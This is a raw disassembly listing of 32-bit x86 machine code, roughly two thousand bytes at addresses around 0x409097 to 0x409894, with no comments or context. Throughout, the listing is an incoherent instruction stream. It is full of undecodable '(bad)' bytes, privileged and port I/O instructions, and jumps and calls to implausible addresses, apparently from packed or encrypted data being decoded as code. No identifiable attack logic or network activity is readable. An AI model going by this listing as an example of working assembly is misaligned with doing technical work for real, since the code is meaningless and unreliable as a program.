  409097:	mov    dh,0x3d
  409099:	xchg   ecx,eax
  40909a:	inc    esp
  40909b:	mov    cl,0xc2
  40909d:	(bad)  
  40909e:	je     0x409091
  4090a0:	pop    edx
  4090a1:	scas   eax,DWORD PTR es:[edi]
  4090a2:	stc    
  4090a3:	sahf   
  4090a4:	and    eax,0x32917c93
  4090a9:	mov    DWORD PTR [edx],ecx
  4090ab:	push   ecx
  4090ac:	xor    dl,BYTE PTR [eax+eax*1]
  4090af:	add    BYTE PTR [eax-0x37],bl
  4090b2:	mov    edx,0x458d1360
  4090b8:	loopne 0x40907c
  4090ba:	std    
  4090bb:	jne    0x409099
  4090bd:	daa    
  4090be:	jne    0x4090cc
  4090c0:	iret   
  4090c1:	lea    eax,[esi]
  4090c3:	call   0x3fb690
  4090c8:	retf   
  4090c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ca:	test   BYTE PTR [eax],0x5
  4090cd:	or     eax,0x131800b8
  4090d2:	add    BYTE PTR [esi+0x61],bl
  4090d5:	push   ebp
  4090d6:	or     BYTE PTR [eax],al
  4090d8:	add    BYTE PTR [eax],al
  4090da:	lea    edi,[esi-0x71a0af0a]
  4090e0:	push   es
  4090e1:	call   0x4012f6
  4090e6:	and    DWORD PTR [ebx],0xffffffe9
  4090e9:	sti    
  4090ea:	or     BYTE PTR [ebx],dl
  4090ec:	add    bh,bh
  4090ee:	lds    ecx,FWORD PTR [edx]
  4090f0:	call   0xff691bdc
  4090f5:	cmp    edx,DWORD PTR [ebp+0x3105750e]
  4090fb:	adc    BYTE PTR [eax],al
  4090fd:	add    al,bl
  4090ff:	xchg   ebx,eax
  409100:	jl     0x4090fe
  409102:	(bad)  
  409103:	test   al,0x22
  409105:	lea    edx,ds:0x55ff5010
  40910b:	add    bh,ah
  40910d:	or     eax,0x8dff2329
  409112:	push   ebp
  409113:	adc    BYTE PTR [eax-0x1],dl
  409116:	gs add bh,ah
  409119:	cmp    ah,dl
  40911b:	and    bh,bh
  40911d:	lea    edx,[ebp+0x10]
  409120:	push   eax
  409121:	jmp    DWORD PTR ds:0xd22ee700
  409127:	and    bh,bh
  409129:	lea    esi,[ecx]
  40912b:	xor    BYTE PTR [eax+edx*2],cl
  40912e:	outs   dx,BYTE PTR ds:[esi]
  40912f:	daa    
  409130:	cld    
  409131:	out    0x82,eax
  409133:	xchg   ecx,eax
  409134:	adc    bh,bh
  409136:	test   al,0x37
  409138:	adc    al,0x8d
  40913a:	in     al,dx
  40913b:	test   BYTE PTR [esi+edi*8-0xb3c0000],dh
  409142:	sbb    al,ah
  409144:	dec    edx
  409145:	jne    0x40915a
  409147:	mov    esp,esi
  409149:	push   eax
  40914a:	add    DWORD PTR [ebp+0x39],0x397511bc
  409151:	push   ebx
  409152:	pop    ecx
  409153:	sti    
  409154:	es push edi
  409156:	jge    0x40919d
  409158:	or     DWORD PTR [ebx-0x6f],ebp
  40915b:	out    dx,eax
  40915c:	xor    DWORD PTR [edi+0x3f8c8295],edi
  409162:	add    al,0x74
  409164:	xchg   esp,eax
  409165:	push   0xffffff91
  409167:	out    0x31,eax
  409169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40916a:	test   eax,0x4237482
  40916f:	je     0x4091c1
  409171:	xchg   ebx,eax
  409172:	lds    edi,FWORD PTR [ebx]
  409174:	jo     0x409161
  409176:	adc    DWORD PTR [ebp-0x1f],esi
  409179:	and    ecx,DWORD PTR [edi+0x68]
  40917c:	xor    ebx,ebp
  40917e:	std    
  40917f:	mov    edi,0x319acd44
  409184:	add    eax,0x44ff042c
  409189:	fistp  DWORD PTR [edx]
  40918b:	stos   BYTE PTR es:[edi],al
  40918c:	dec    ecx
  40918d:	jmp    0x409191
  40918f:	or     esi,DWORD PTR [ecx+0x68]
  409192:	add    DWORD PTR [eax+0x6b],ebp
  409195:	pop    ss
  409196:	(bad)  
  409199:	dec    eax
  40919a:	adc    al,0xe8
  40919c:	mov    eax,0x3a000453
  4091a1:	stos   DWORD PTR es:[edi],eax
  4091a2:	xchg   esi,eax
  4091a3:	sub    eax,0x14190000
  4091a8:	jmp    0x9dff1fb0
  4091ad:	cwde   
  4091ae:	sub    ch,ah
  4091b0:	sbb    esi,DWORD PTR [esi+0x6e]
  4091b3:	std    
  4091b4:	lea    ebx,[eax-0x402aa]
  4091ba:	push   esi
  4091bb:	rcr    BYTE PTR [edx+0x12],1
  4091be:	push   esi
  4091bf:	std    
  4091c0:	sti    
  4091c1:	pop    ds
  4091c2:	dec    esi
  4091c3:	xchg   ebp,ebx
  4091c5:	sbb    esi,DWORD PTR [eax-0x5e]
  4091c8:	adc    bh,BYTE PTR gs:[esi]
  4091cb:	xchg   DWORD PTR [ecx+0x12],edx
  4091ce:	mov    esp,0xc359410f
  4091d3:	cld    
  4091d4:	dec    ebp
  4091d5:	adc    bl,BYTE PTR [esp+eax*1-0x33bb9af]
  4091dc:	cmp    eax,0x40f09c12
  4091e1:	dec    esi
  4091e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e3:	cld    
  4091e4:	sub    eax,0x10ec7c12
  4091e9:	push   esi
  4091ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091eb:	cld    
  4091ec:	sbb    eax,0x117eb3c1
  4091f1:	add    esp,DWORD PTR [ebp+0xc]
  4091f4:	loop   0x40920f
  4091f6:	ss xchg edi,eax
  4091f8:	std    
  4091f9:	adc    dh,bl
  4091fb:	cld    
  4091fc:	jno    0x4091c6
  4091fe:	ficomp WORD PTR [ebp+0x20]
  409201:	inc    ebp
  409202:	cmp    DWORD PTR [esp+edx*4],edx
  409205:	jle    0x4091dc
  409207:	nop
  409208:	lods   al,BYTE PTR ds:[esi]
  409209:	adc    BYTE PTR [eax],al
  40920b:	add    BYTE PTR [esi+0x6a1bed86],bh
  409211:	mov    esp,0xd43a11d5
  409216:	push   ebx
  409217:	shl    DWORD PTR [ebp-0x694b3aaa],1
  40921d:	loop   0x40928b
  40921f:	adc    DWORD PTR [esi+0x213bfffc],edx
  409225:	std    
  409226:	je     0x409205
  409228:	sub    al,ch
  40922a:	lea    esp,[esi+0x15c00920]
  409230:	cmp    ch,0x74
  409233:	loope  0x409276
  409235:	xchg   esp,edi
  409237:	cmp    DWORD PTR [eax+0x5c86fefe],0xbad974bc
  409241:	cld    
  409242:	push   cs
  409243:	xchg   bl,ah
  409245:	cld    
  409246:	je     0x409225
  409248:	and    DWORD PTR [edi-0x3b2caef8],eax
  40924e:	(bad)  
  40924f:	pop    esi
  409250:	and    BYTE PTR [edi-0x7782be04],al
  409256:	dec    BYTE PTR [esi+0x6a]
  409259:	(bad)  
  40925a:	pop    es
  40925b:	jmp    0x692c2147
  409260:	imul   eax,eax,0xd32036fd
  409266:	test   BYTE PTR [ecx+0x23],dh
  409269:	sti    
  40926a:	(bad)  
  40926b:	jmp    0x7240a6a2
  409270:	add    BYTE PTR [eax],al
  409272:	out    dx,al
  409273:	ud2    
  409275:	sub    ecx,ecx
  409277:	adc    BYTE PTR [eax+0x58132d1],al
  40927d:	adc    BYTE PTR [edx+0x41e90014],ah
  409283:	or     DWORD PTR [ecx+eax*1],0xeefeb431
  40928a:	lds    edi,FWORD PTR [ebx-0x4665098c]
  409290:	sub    ebp,DWORD PTR [eax]
  409292:	sub    eax,0x4ae574fb
  409297:	lods   eax,DWORD PTR ds:[esi]
  409298:	xchg   edi,eax
  409299:	into   
  40929a:	inc    ecx
  40929b:	out    dx,eax
  40929c:	or     al,0x0
  40929e:	add    BYTE PTR [ecx+0x2c],dl
  4092a1:	inc    ecx
  4092a2:	mov    BYTE PTR [esi*2-0x67968ff4],ah
  4092a9:	call   edi
  4092ab:	jle    0x409232
  4092ad:	mov    eax,0x68ff24d6
  4092b2:	push   esi
  4092b3:	push   ss
  4092b4:	add    BYTE PTR [eax],al
  4092b6:	aad    0x91
  4092b8:	sar    esi,0xb7
  4092bb:	and    al,0x50
  4092bd:	call   0x40153c
  4092c2:	lds    edx,FWORD PTR [ecx+0x23c7fec1]
  4092c8:	push   eax
  4092c9:	(bad)  
  4092ca:	std    
  4092cb:	dec    esi
  4092cc:	(bad)  
  4092cd:	call   edi
  4092cf:	push   ds
  4092d0:	dec    esi
  4092d1:	dec    ax
  4092d3:	pop    ss
  4092d4:	mov    DWORD PTR [ebp+0x24c40000],eax
  4092da:	(bad)  
  4092db:	(bad)  
  4092dc:	fcom   DWORD PTR [ebx]
  4092de:	test   bl,dh
  4092e0:	or     BYTE PTR [edi],dl
  4092e2:	add    BYTE PTR [ebp-0x1ae83],cl
  4092e8:	inc    edi
  4092e9:	sbb    al,0x2
  4092eb:	adc    BYTE PTR [eax],bl
  4092ed:	pop    ss
  4092ee:	add    BYTE PTR [ebp+edx*8+0x79],dh
  4092f2:	inc    edx
  4092f3:	sub    al,0xb8
  4092f5:	sahf   
  4092f6:	mov    bh,0x2c
  4092f8:	cdq    
  4092f9:	push   ss
  4092fa:	call   0x57412a
  4092ff:	or     ecx,DWORD PTR [eax]
  409301:	mov    ds:0x1781e903,al
  409306:	add    BYTE PTR [eax],al
  409308:	push   ebp
  409309:	add    dl,0xfe
  40930c:	xlat   BYTE PTR ds:[ebx]
  40930d:	or     cl,BYTE PTR [ebp+0x66c02442]
  409313:	mov    ebx,0xe7fed124
  409318:	xor    ebx,esi
  40931a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40931b:	jmp    DWORD PTR [esi+0x347542f5]
  409321:	in     al,0x7f
  409323:	add    BYTE PTR [ecx],dh
  409325:	in     eax,dx
  409326:	or     eax,0x9fd53d75
  40932b:	sahf   
  40932c:	xchg   BYTE PTR [ecx+0x204bffa],ch
  409332:	fwait
  409333:	int3   
  409334:	dec    ecx
  409335:	sub    al,0x4
  409337:	jmp    esp
  409339:	lock sbb cl,BYTE PTR [ecx]
  40933c:	add    BYTE PTR [eax],al
  40933e:	leave  
  40933f:	mov    DWORD PTR [esi],ecx
  409341:	jmp    0x40936e
  409343:	daa    
  409344:	add    al,0xff
  409346:	fsub   st(0),st
  409348:	sbb    bh,ch
  40934a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40934b:	or     DWORD PTR [edi],0xdae9c8d
  409351:	(bad)  
  409352:	ds jg  0x409307
  409355:	sub    esp,ebx
  409357:	mov    esp,0x62c9411a
  40935c:	(bad)  
  40935e:	es loope 0x409353
  409361:	dec    edi
  409362:	push   ds
  409363:	mov    ecx,0x3a1be7fa
  409368:	ud0    ebx,DWORD PTR [ecx]
  40936b:	add    BYTE PTR [edi-0x1],dh
  40936e:	push   es
  40936f:	push   edi
  409370:	ret    
  409371:	mov    WORD PTR [ebx-0x21],?
  409374:	jnp    0x4092fb
  409376:	mov    ebp,0xeeff0f19
  40937b:	cwde   
  40937c:	repnz (bad) 
  40937e:	pushf  
  40937f:	pop    edi
  409380:	push   cs
  409381:	(bad)  
  409382:	fisub  WORD PTR [ebx]
  409384:	dec    edi
  409385:	xor    bx,bp
  409388:	stc    
  409389:	mov    edi,0xcc9ad345
  40938e:	sbb    DWORD PTR [edx+eax*1-0xaebbb01],ebp
  409395:	sbb    eax,DWORD PTR [eax-0x51f1225f]
  40939b:	mov    edi,0xf9a60d9c
  4093a0:	cmp    BYTE PTR [eax+eax*1],bl
  4093a3:	add    BYTE PTR [eax+0x10ec5a1],bl
  4093a9:	fs mov esi,0x48ec3698
  4093af:	push   cs
  4093b0:	xchg   cl,bh
  4093b2:	rcl    BYTE PTR [esi],0xa2
  4093b5:	stc    
  4093b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b7:	sub    BYTE PTR [esi+edx*8+0x646e0e9e],0x96
  4093bf:	pop    eax
  4093c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c1:	cli    
  4093c2:	lea    ecx,[esi]
  4093c4:	dec    ecx
  4093c5:	addr16 or al,0x4
  4093c8:	xor    DWORD PTR [edi+0x1cb5fea8],ecx
  4093ce:	jbe    0x4093de
  4093d0:	inc    esi
  4093d1:	stc    
  4093d2:	xor    ecx,DWORD PTR [edi+0x3f]
  4093d5:	stc    
  4093d6:	gs sbb edx,ecx
  4093d9:	outs   dx,BYTE PTR ds:[esi]
  4093da:	jmp    0x90ffc1e2
  4093df:	or     eax,0x4640f926
  4093e4:	ret    0x45f8
  4093e7:	cmp    al,0xf3
  4093e9:	pop    es
  4093ea:	jmp    0x68284fa7
  4093ef:	inc    edi
  4093f0:	sar    ecx,0x2d
  4093f3:	push   cs
  4093f4:	test   BYTE PTR [esi-0x709f2a0],0xe8
  4093fb:	add    esi,DWORD PTR [ecx]
  4093fd:	adc    al,0x62
  4093ff:	enter  0xd3a,0x29
  409403:	xchg   edi,eax
  409404:	xor    eax,0x3c094
  409409:	add    BYTE PTR [edi+ecx*1+0x10],bl
  40940d:	cld    
  40940e:	xor    DWORD PTR [eax+eax*1],edx
  409411:	jmp    0xa86c4ac0
  409416:	xor    bh,cl
  409418:	je     0x40940f
  40941a:	sbb    al,BYTE PTR [ebx-0x69]
  40941d:	fidivr WORD PTR [ebx+ecx*4]
  409420:	test   BYTE PTR [ecx+0x41fef937],dl
  409426:	outs   dx,DWORD PTR ds:[esi]
  409427:	adc    eax,DWORD PTR [eax]
  409429:	jmp    0xc0022345
  40942e:	cmp    al,0xf9
  409430:	dec    edi
  409431:	shr    edx,0xa4
  409434:	(bad)  
  409435:	scas   al,BYTE PTR es:[edi]
  409436:	dec    BYTE PTR [esi-0x6db583f]
  40943c:	dec    edi
  40943d:	sahf   
  40943e:	push   es
  40943f:	mov    esp,0xec3496fd
  409444:	in     al,0x5
  409446:	xor    eax,0x16c8914
  40944b:	cli    
  40944c:	(bad)  
  40944d:	jle    0x4094c4
  40944f:	or     DWORD PTR [edi+ebp*4+0x5c00142d],eax
  409456:	(bad)  
  409457:	aad    0xfd
  409459:	data16 and al,0x1
  40945c:	add    bh,cl
  40945e:	xor    dl,BYTE PTR [eax+eax*1]
  409461:	out    0xae,al
  409463:	xchg   edi,edi
  409465:	call   0x2bd51d9c
  40946a:	daa    
  40946b:	idiv   esi
  40946d:	ins    BYTE PTR es:[edi],dx
  40946e:	add    BYTE PTR [eax],al
  409470:	repz sub edx,DWORD PTR [eax-0x3f]
  409474:	jnp    0x40949e
  409476:	inc    ecx
  409477:	jmp    0xe9a45096
  40947c:	xor    cl,BYTE PTR [ebx]
  40947e:	rcl    BYTE PTR [eax+esi*1+0x5e6474eb],0xd2
  409486:	std    
  409487:	push   cs
  409488:	sub    al,0x89
  40948a:	inc    ecx
  40948b:	add    ah,bh
  40948d:	ret    
  40948e:	mov    bx,0xd2fc
  409492:	(bad)  
  409493:	out    0x5e,eax
  409495:	lods   al,BYTE PTR ds:[esi]
  409496:	(bad)  
  409497:	call   ebx
  409499:	push   ebx
  40949a:	jne    0x40949e
  40949c:	jecxz  0x40944a
  40949e:	mov    edx,DWORD PTR [ebp-0xf626]
  4094a4:	or     eax,0x15892ad5
  4094a9:	pop    edi
  4094aa:	(bad)  
  4094ab:	jmp    FWORD PTR [edi-0x65]
  4094ae:	retf   
  4094af:	sub    BYTE PTR [ecx+0x10],bl
  4094b2:	push   DWORD PTR [ebp-0x74]
  4094b5:	sbb    ebx,DWORD PTR [ecx-0xf7306a]
  4094bb:	mov    ch,0xd4
  4094bd:	or     bh,bh
  4094bf:	jmp    FWORD PTR [eax]
  4094c1:	sbb    cl,ah
  4094c3:	xchg   esi,eax
  4094c4:	mov    edi,0xf8858908
  4094c9:	or     bh,bh
  4094cb:	(bad)  
  4094cc:	cmp    BYTE PTR [eax+0x10193c48],bl
  4094d2:	push   DWORD PTR [ebp+0x9080000]
  4094d8:	(bad)  
  4094d9:	push   DWORD PTR [eax+0x480063a4]
  4094df:	cld    
  4094e0:	mov    esi,0x4e9b2b74
  4094e5:	cmp    al,0xd9
  4094e7:	adc    bh,bh
  4094e9:	mov    ch,0xb8
  4094eb:	or     bh,bh
  4094ed:	jmp    FWORD PTR [edi-0x62]
  4094f0:	push   es
  4094f1:	call   0x3f9ae7
  4094f6:	jo     0x409544
  4094f8:	xchg   edx,eax
  4094f9:	dec    DWORD PTR [edi+0x76]
  4094fc:	test   edx,eax
  4094fe:	dec    esi
  4094ff:	or     bh,bh
  409501:	push   eax
  409502:	dec    edi
  409503:	pop    esi
  409504:	mov    esp,0xc1e31fe
  409509:	call   0x43262e
  40950e:	lods   al,BYTE PTR ds:[esi]
  40950f:	sub    al,0xfc
  409511:	test   BYTE PTR [esi+esi*8+0xa],dh
  409515:	inc    esi
  409517:	aaa    
  409518:	dec    edi
  409519:	(bad)  
  40951a:	mov    esi,0x4d2419e5
  40951f:	in     eax,dx
  409520:	add    bh,bh
  409522:	in     al,0xb4
  409524:	or     edi,edi
  409526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409527:	aam    0x7e
  409529:	xchg   edx,eax
  40952a:	sahf   
  40952b:	lds    edi,FWORD PTR [edx+eax*8]
  40952e:	sub    ebp,ebp
  409530:	scas   eax,DWORD PTR es:[edi]
  409531:	mov    bl,BYTE PTR [ebp-0x66f46f4b]
  409537:	mov    cl,0x71
  409539:	inc    DWORD PTR [eax]
  40953b:	add    BYTE PTR [esi-0xf],bh
  40953e:	inc    edx
  40953f:	je     0x409567
  409541:	cmp    eax,0x4e4feb4
  409546:	sbb    ebp,DWORD PTR [ebx-0x17f56299]
  40954c:	enter  0xb7a,0xff
  409550:	push   0xe5fffbaa
  409555:	sbb    DWORD PTR [eax],0x9e806d83
  40955b:	dec    eax
  40955d:	retf   
  40955e:	or     DWORD PTR [ebp+0x29],esi
  409561:	gs jg  0x4094f3
  409564:	cs push edi
  409566:	jge    0x4095ad
  409568:	and    eax,0xa4feecd2
  40956d:	repz sbb bh,BYTE PTR [edi+0x6a0b4f16]
  409574:	push   edx
  409575:	ss xchg ecx,eax
  409577:	pop    es
  409578:	sbb    DWORD PTR [ecx+0xb],edi
  40957b:	(bad)  
  40957c:	(bad)  
  40957d:	shl    esi,1
  40957f:	(bad)  
  409580:	jl     0x409596
  409582:	icebp  
  409583:	sbb    ebx,DWORD PTR [edx+0x5b0b1df5]
  409589:	adc    al,0x81
  40958b:	xchg   ebp,eax
  40958c:	sbb    dl,BYTE PTR [ebx-0x17]
  40958f:	fwait
  409590:	js     0x4095ca
  409592:	test   al,0x3
  409594:	into   
  409595:	aas    
  409596:	popf   
  409597:	fdiv   QWORD PTR [ecx+0x14]
  40959a:	add    edi,edx
  40959c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959d:	cmc    
  40959e:	in     eax,dx
  40959f:	inc    BYTE PTR [eax]
  4095a1:	add    BYTE PTR [esi-0x80],dh
  4095a4:	std    
  4095a5:	mov    bl,0x16
  4095a7:	fs sbb eax,0xd645a6c5
  4095ad:	nop
  4095ae:	ss in  al,dx
  4095b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b1:	pop    es
  4095b2:	xchg   esi,eax
  4095b3:	cmc    
  4095b4:	rol    BYTE PTR [esi],1
  4095b6:	mov    ds:0x869dbdf5,eax
  4095bb:	ins    DWORD PTR es:[edi],dx
  4095bc:	imul   eax,edi,0xfffffff1
  4095bf:	adc    eax,DWORD PTR [ecx-0x52]
  4095c2:	cmp    dl,BYTE PTR [ebx-0x17]
  4095c5:	or     ah,BYTE PTR [eax+ebx*2]
  4095c8:	rol    ah,1
  4095ca:	in     ax,dx
  4095cc:	in     al,dx
  4095cd:	jo     0x40962d
  4095cf:	cmc    
  4095d0:	loope  0x409615
  4095d2:	fstp   QWORD PTR [edi]
  4095d4:	sbb    DWORD PTR [esi+edi*8-0x1efbd7c9],ebx
  4095db:	hlt    
  4095dc:	sti    
  4095dd:	sti    
  4095de:	push   esi
  4095df:	mov    ds:0xec360a6c,al
  4095e4:	cmp    al,0x74
  4095e6:	cs cmc 
  4095e8:	rol    BYTE PTR [ebx],cl
  4095ea:	fwait
  4095eb:	adc    al,0xc1
  4095ed:	outs   dx,DWORD PTR ds:[esi]
  4095ee:	pop    ebp
  4095ef:	push   ebx
  4095f0:	jmp    0xe935ac90
  4095f5:	sbb    DWORD PTR [ecx],0xffffffdb
  4095f8:	push   esp
  4095f9:	or     al,BYTE PTR [esi]
  4095fb:	or     DWORD PTR [eax],eax
  4095fd:	sub    DWORD PTR [esi+0x1a995030],ebp
  409603:	jne    0x4095a0
  409605:	add    BYTE PTR es:[eax],al
  409608:	cmp    ecx,DWORD PTR [ecx]
  40960a:	rcl    BYTE PTR [ebp-0x4697bb2a],0xf6
  409611:	push   ebx
  409612:	add    BYTE PTR [ecx+0x11087f2b],bh
  409618:	xchg   esi,eax
  409619:	clc    
  40961a:	(bad)  
  40961b:	(bad)  
  40961c:	sub    edx,DWORD PTR [esi-0x13d70970]
  409622:	cwde   
  409623:	pop    eax
  409624:	sub    esi,ebp
  409626:	(bad)  
  409627:	pop    esp
  409628:	cmp    ebp,esi
  40962a:	je     0x40961d
  40962c:	dec    edx
  40962d:	or     BYTE PTR [edi-0x3e34d72a],cl
  409633:	in     eax,0x32
  409635:	pop    edi
  409636:	mov    edx,ebp
  409638:	mov    dl,0xcf
  40963a:	jmp    0x4095f2
  40963c:	cmp    ch,dh
  40963e:	mov    WORD PTR [ecx+ebp*1],gs
  409641:	push   DWORD PTR fs:[edi*2+0x4af574f5]
  409649:	loop   0x4096ad
  40964b:	jmp    0xe7009f82
  409650:	(bad)  
  409652:	(bad)  
  409653:	call   0x8185638a
  409658:	xor    eax,0xf1e90014
  40965d:	dec    esi
  40965e:	hlt    
  40965f:	jbe    0x409691
  409661:	adc    al,0x0
  409663:	add    ebp,DWORD PTR ds:0x32d3006a
  409669:	jle    0x40966b
  40966b:	ins    BYTE PTR es:[edi],dx
  40966c:	add    BYTE PTR [eax],al
  40966e:	out    0xe7,al
  409670:	dec    edi
  409671:	fs sahf 
  409673:	call   0x4468e56e
  409678:	inc    DWORD PTR [eax]
  40967a:	int    0x1f
  40967c:	push   DWORD PTR [ebp+0x44]
  40967f:	adc    BYTE PTR [ebx+eiz*2-0x3ff4e7f8],ah
  409686:	mov    esp,0xd88ee7f2
  40968b:	pop    ss
  40968c:	add    BYTE PTR [eax+0x15],ch
  40968f:	sar    BYTE PTR [edi],1
  409691:	add    BYTE PTR [edi-0x5d],al
  409694:	push   cs
  409695:	call   0x3ffaa9
  40969a:	test   al,0x70
  40969c:	ror    BYTE PTR [ebp-0x8fbb3],1
  4096a2:	(bad)  
  4096a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a4:	push   eax
  4096a5:	call   0x3ffaa9
  4096aa:	and    DWORD PTR [edx-0x10],esi
  4096ad:	test   DWORD PTR [edi+0x190de81c],0x886aff1c
  4096b7:	(bad)  
  4096b8:	fdivr  DWORD PTR [ecx+ebx*2]
  4096bb:	sbb    bh,bh
  4096bd:	mov    ch,0xc8
  4096bf:	add    al,0xff
  4096c1:	inc    edi
  4096c3:	mov    ds:0x8358e80a,al
  4096c8:	(bad)  
  4096c9:	jmp    ecx
  4096cb:	jno    0x4096b9
  4096cd:	test   edi,0xbd831c
  4096d3:	add    BYTE PTR [esp+eax*1-0x5cb70001],dh
  4096da:	adc    DWORD PTR [eax+0x59],ebp
  4096dd:	pop    ss
  4096de:	out    dx,eax
  4096df:	mov    esi,0xf7ec61c7
  4096e4:	(bad)  
  4096e5:	sbb    edi,edi
  4096e7:	jne    0x409739
  4096e9:	seta   BYTE PTR [edx-0x4a00e369]
  4096f0:	je     0x4096f6
  4096f2:	(bad)  
  4096f3:	push   DWORD PTR [ecx]
  4096f5:	push   ebp
  4096f6:	cmp    al,0x90
  4096f8:	push   ss
  4096f9:	bound  ecx,QWORD PTR [eax]
  4096fb:	mov    ch,0x1
  4096fd:	xor    cl,BYTE PTR [eax]
  4096ff:	inc    DWORD PTR [esi]
  409701:	test   al,0xf6
  409703:	inc    BYTE PTR [ebp+esi*8+0x41f6301a]
  40970a:	or     bh,bh
  40970c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40970d:	or     al,0x10
  40970f:	jmp    esi
  409711:	add    al,0x58
  409713:	nop
  409714:	fimul  WORD PTR [ecx]
  409716:	or     BYTE PTR [ebp-0x27],al
  409719:	adc    edi,DWORD PTR [edi+0x819cefe]
  40971f:	jne    0x4096e6
  409721:	add    al,0xa
  409723:	bound  esi,QWORD PTR [ecx]
  409725:	std    
  409726:	cmp    edx,eax
  409728:	and    eax,0x9d8aadfd
  40972d:	jnp    0x40976f
  40972f:	call   0x8d4768d2
  409734:	hlt    
  409735:	enter  0xfeb3,0x0
  409739:	add    BYTE PTR [ebp*8-0x3ac28afb],bl
  409740:	and    ah,BYTE PTR [edx+0x31]
  409743:	std    
  409744:	stc    
  409745:	mov    edi,0xe6802e
  40974a:	xor    ebp,edi
  40974c:	cmp    eax,0x2fc6945
  409751:	add    BYTE PTR [ecx],dh
  409753:	mov    edx,0x15ef3c0
  409758:	add    eax,DWORD PTR [eax]
  40975a:	retf   
  40975b:	cld    
  40975c:	cwde   
  40975d:	(bad)  
  40975e:	fdivr  st,st(4)
  409760:	cwde   
  409761:	push   DWORD PTR [ebp-0x53afefc9]
  409767:	jg     0x409779
  409769:	div    DWORD PTR [esi]
  40976b:	xor    DWORD PTR [esi+edi*8+0x76114a4],0x5150f09c
  409776:	xchg   ebx,eax
  409777:	adc    al,0xe9
  409779:	cli    
  40977a:	(bad)  
  40977b:	push   0x15101ce4
  409780:	jmp    0x11203088
  409785:	(bad)  
  409788:	mov    ebx,0x59cd0ef3
  40978d:	pop    es
  40978e:	out    dx,al
  40978f:	inc    esp
  409790:	jb     0x4097c6
  409792:	mov    ah,0x97
  409794:	adc    al,0xf
  409796:	fdivrp st(1),st
  409798:	mov    eax,0x79dcceb1
  40979d:	pop    es
  40979e:	add    BYTE PTR [eax],al
  4097a0:	into   
  4097a1:	fwait
  4097a2:	imul   edx,DWORD PTR [esi+edi*4],0xfffffff1
  4097a6:	std    
  4097a7:	sbb    ebx,DWORD PTR [edi]
  4097a9:	test   ch,dh
  4097ab:	push   es
  4097ac:	dec    ebx
  4097ad:	adc    al,0x83
  4097af:	add    ebp,DWORD PTR [esi-0x59f12759]
  4097b5:	icebp  
  4097b6:	fst    QWORD PTR [eax+0x730cfc2a]
  4097bc:	xchg   esi,eax
  4097bd:	icebp  
  4097be:	pop    edi
  4097bf:	sbb    BYTE PTR [ebp-0x79f93a17],0xa7
  4097c6:	int3   
  4097c7:	push   cs
  4097c8:	jle    0x4097bb
  4097ca:	sar    BYTE PTR [edi],0x98
  4097cd:	icebp  
  4097ce:	lods   eax,DWORD PTR ds:[esi]
  4097cf:	cli    
  4097d0:	scas   al,BYTE PTR es:[edi]
  4097d1:	push   0x97b9b40a
  4097d6:	nop
  4097d7:	push   cs
  4097d8:	pop    esi
  4097d9:	icebp  
  4097da:	xchg   ebp,eax
  4097db:	push   eax
  4097dc:	dec    ecx
  4097dd:	jmp    0x13999e6f
  4097e2:	pop    esp
  4097e3:	push   es
  4097e4:	inc    esi
  4097e5:	sbb    eax,0x7bf68fa9
  4097ea:	add    bl,ch
  4097ec:	xor    al,BYTE PTR [ecx]
  4097ee:	mov    esi,0x412fd701
  4097f3:	jmp    0x57283f27
  4097f8:	aaa    
  4097f9:	icebp  
  4097fa:	(bad)  
  4097fb:	fcomp  QWORD PTR [edx]
  4097fd:	stc    
  4097fe:	xchg   edi,eax
  4097ff:	xchg   ebp,eax
  409800:	aaa    
  409801:	icebp  
  409802:	addr16 jmp 0x409805
  409805:	add    BYTE PTR [edx],dh
  409807:	add    DWORD PTR [esi+0x412fa4d1],edi
  40980d:	jmp    0x37283f41
  409812:	aaa    
  409813:	icebp  
  409814:	(bad)  
  409815:	pushf  
  409816:	jmp    0x67f1:0x37557ff8
  40981d:	jmp    0x81fe9954
  409822:	pusha  
  409823:	xor    BYTE PTR [ecx-0x17],al
  409826:	das    
  409827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409828:	out    0xf6,eax
  40982a:	xor    al,0xf1
  40982c:	(bad)  
  40982d:	jl     0x4097e9
  40982f:	clc    
  409830:	addr16 xor eax,0x7de7f137
  409836:	sbb    al,0xf1
  409838:	(bad)  
  409839:	fsubp  st(6),st
  40983b:	push   esi
  40983d:	(bad)  
  40983e:	sub    al,0xfc
  409840:	mov    BYTE PTR [esi+0x34],bl
  409843:	icebp  
  409844:	(bad)  
  409845:	jl     0x409864
  409847:	jmp    0x6775574a
  40984c:	or     al,0xb6
  40984e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40984f:	sbb    al,ch
  409851:	mov    WORD PTR [edi],?
  409853:	icebp  
  409854:	(bad)  
  409855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409856:	mul    bl
  409858:	neg    BYTE PTR [esi+0x666cfc34]
  40985e:	sub    al,0xf1
  409860:	(bad)  
  409861:	and    al,0x3d
  409863:	sti    
  409864:	lock add BYTE PTR [esi+0xffff16],ch
  40986b:	add    BYTE PTR [ebp+0x18],al
  40986e:	call   0x58c22a
  409873:	leave  
  409874:	(bad)  
  409876:	(bad)  
  409877:	push   esp
  409878:	mov    ds:0x7cc4830c,eax
  40987d:	mov    bh,dh
  40987f:	imul   ebp,DWORD PTR [edx],0x70087519
  409885:	cdq    
  409886:	mov    bh,bh
  409888:	outs   dx,DWORD PTR ds:[esi]
  409889:	imul   eax,DWORD PTR [ebp-0x4],0xffffffe0
  40988d:	adc    eax,DWORD PTR [eax]
  40988f:	out    dx,eax
  409890:	jle    0x409822
  409892:	mov    al,0x3c
  409894:	cdq    
